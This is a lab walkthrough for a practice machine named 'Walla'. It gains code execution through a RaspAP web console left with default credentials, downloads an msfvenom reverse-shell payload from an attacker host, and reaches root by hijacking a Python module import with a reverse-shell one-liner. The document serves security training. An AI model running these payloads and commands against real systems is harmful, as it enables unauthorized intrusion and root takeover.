_____


# Exploitation Guide for Walla

## Summary

In this walkthrough, we will exploit the target by abusing the enabled web console in a _RaspAP_ web application that uses default authentication credentials. We'll then escalate by exploiting python module import order in a python script that can be run with sudo privileges.

## Enumeration

### Nmap

We'll begin with an `nmap` scan against all TCP ports.

```
kali@kali:~$ sudo nmap -p- 192.168.120.74
Starting Nmap 7.70SVN ( https://nmap.org ) at 2020-09-17 16:06 EDT
Nmap scan report for 192.168.120.74
Host is up (0.020s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
422/tcp   open  ariel3
8091/tcp  open  jamlink
42042/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 235.86 seconds
```

We identify several ports of interest, and after some investigation into the exposed services, we'll focus on ports 23 and 8091. Executing a version scan against these two ports reveals a `telnetd` server on port 23 and a `lighthttp 1.4.53` service on 8091.

```
kali@kali:~$ sudo nmap -p 23,8091 -sV 192.168.120.74
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 11:59 EST
Nmap scan report for 192.168.120.74
Host is up (0.057s latency).

PORT     STATE SERVICE VERSION
23/tcp   open  telnet  Linux telnetd
8091/tcp open  http    lighttpd 1.4.53
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Telnet Enumeration

Since no version information is available for the telnet service, we'll use the `telnet` client to connect to port 23 in an attempt to gather additional information. Through the service's banner, we determine that `netkit-telnet-0.17` is potentially running here.

```
kali@kali:~$ telnet 192.168.120.74
...
Escape character is '^]'.
Linux Telnetd 0.17
Debian GNU/Linux 10
```

An EDB search for `telnetd 0.17` returns [this exploit](https://www.exploit-db.com/exploits/48170). However, after several attempts at exploitation using the available exploit script, we determine that the target is likely not vulnerable to this attack.

### HTTP Enumeration

We'll run an aggressive scan against the HTTP service on port 8091.

```
kali@kali:~$ sudo nmap -p 8091 -A -n 192.168.120.74
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 12:06 EST
Nmap scan report for 192.168.120.74
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
8091/tcp open  http    lighttpd 1.4.53
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
...
```

The scan results show a potential HTTP Basic Authentication control for a _RaspAP_ web application, which we can confirm by accessing the service via a web browser.

## Exploitation

### Remote Code Execution

After a quick online search for "RaspAP vulnerabilities", we find that version 2.5 of the application shipped with a [web based console](https://nvd.nist.gov/vuln/detail/CVE-2020-24572) **webconsole.php**, which grants command execution to authenticated users.

Although we cannot identify this RaspAP application's version at the moment, let's try pursuing this exploit vector. Additional research of the [manual installation guide](https://docs.raspap.com/manual/) reveals that the application also ships with the default credentials of `admin:secret` (as can be seen at the very bottom of the page).

We can confirm that these credentials are valid by successfully authenticating in the RaspAP web GUI (http://192.168.120.74:8091/). After logging in to the application, it looks like the web console (http://192.168.120.74:8091/includes/webconsole.php) grants us code execution as the `www-data` user.

```
  _    _      _     _____                       _                
 | |  | |    | |   /  __ \                     | |            
 | |  | | ___| |__ | /  \/ ___  _ __  ___  ___ | | ___        
 | |/\| |/ _ \ '_ \| |    / _ \| '_ \/ __|/ _ \| |/ _ \ 
 \  /\  /  __/ |_) | \__/\ (_) | | | \__ \ (_) | |  __/  
  \/  \/ \___|____/ \____/\___/|_| |_|___/\___/|_|\___| 
                 http://web-console.org
user@192.168.120.74 ~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
user@192.168.120.74 ~$ uname -a
Linux walla 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
```

Great, we get an easy RCE! The first order of business is to get a proper reverse shell. Let's generate a 64-bit Linux payload.

```
kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.5 LPORT=4444 -f elf -o shell
...
```

We'll host it over HTTP with a python web server.

```
kali@kali:~$ sudo python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, we'll download the payload to the target and give it executable permissions.

```
user@192.168.120.74 ~$ wget http://192.168.118.5/shell -O /tmp/shell
--2021-03-04 12:41:24--  http://192.168.118.5/shell
Connecting to 192.168.118.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: '/tmp/shell'
     0K                                                       100% 30.4M=0s
2021-03-04 12:41:24 (30.4 MB/s) - '/tmp/shell' saved [194/194]
user@192.168.120.74 ~$ chmod +x /tmp/shell
```

Finally, we'll start a Netcat listener on port 4444 and then trigger our reverse shell from the web console.

```
user@192.168.120.74 ~$ /tmp/shell
...
```

Our Netcat listener successfully catches the reverse shell.

```
kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
192.168.120.98: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.98] 49742
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@walla:/var/www/html/includes$
```

## Escalation

### Sudo Enumeration

Let's first check what commands this user is able to run with `sudo`.

```
www-data@walla:/var/www/html/includes$ sudo -l
sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```

We find that the `www-data` user has the ability to execute a number of commands as root. Of the above entries, one in particular looks interesting:

```
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
```

We are able to run this script with elevated privileges. Let's check if we can modify it to include a reverse shell.

```
www-data@walla:/var/www/html/includes$ ls -l /home/walter/wifi_reset.py
ls -l /home/walter/wifi_reset.py
-rw-r--r-- 1 root root 251 Sep 17 14:31 /home/walter/wifi_reset.py
```

Unfortunately, we cannot write to this script. We can, however, read it.

```
www-data@walla:/var/www/html/includes$ cat /home/walter/wifi_reset.py
cat /home/walter/wifi_reset.py
#!/usr/bin/python

import sys

try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()

wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificotroller.start("wlan0", "1")
www-data@walla:/var/www/html/includes$
```

### Python Module Import Hijacking

Looking at the contents of the **wifi_reset.py** file, we can see that the script attempts to load a `wificontroller` module. If the module is not found, the script simply exits. After checking home directory permissions on the target, we find that the `www-data` user is able to write to the **/home/walter** directory.

```
www-data@walla:/var/www/html/includes$ ls -l /home
ls -l /home
total 16
drwxr-xr-x 2 janis    janis    4096 Mar  4 11:41 janis
drwxr-xr-x 2 paige    paige    4096 Sep 17 14:31 paige
drwxr-xr-x 2 terry    terry    4096 Sep 17 14:31 terry
drwxr-xr-x 2 www-data www-data 4096 Sep 17 17:16 walter
```

Having some basic knowledge of [python paths and module import order](https://stackoverflow.com/questions/9586630/python-paths-and-import-order), we can use our ability to write to the same directory our python script lives in and place a malicious **wificontroller.py** script there. Our malicious module would be executed (imported) as root since one of the **sudoers** entries allows us to execute the **wifi_reset.py** script with elevated privileges.

We'll use a basic python reverse shell for this purpose and write it to the **/home/walter/wificontroller.py** file.

```
www-data@walla:/var/www/html/includes$ echo 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /home/walter/wificontroller.py
```

Let's restart our Netcat listener on port 4444.

```
kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
```

Lastly, we'll execute the python script on the target to trigger our payload.

```
www-data@walla:/var/www/html/includes$ sudo /usr/bin/python /home/walter/wifi_reset.py
<es$ sudo /usr/bin/python /home/walter/wifi_reset.py
...
```

As our malicious module gets imported and executed, we obtain our root shell.

```
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.98: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.98] 49744
root@walla:/var/www/html/includes# id
id
uid=0(root) gid=0(root) groups=0(root)
```
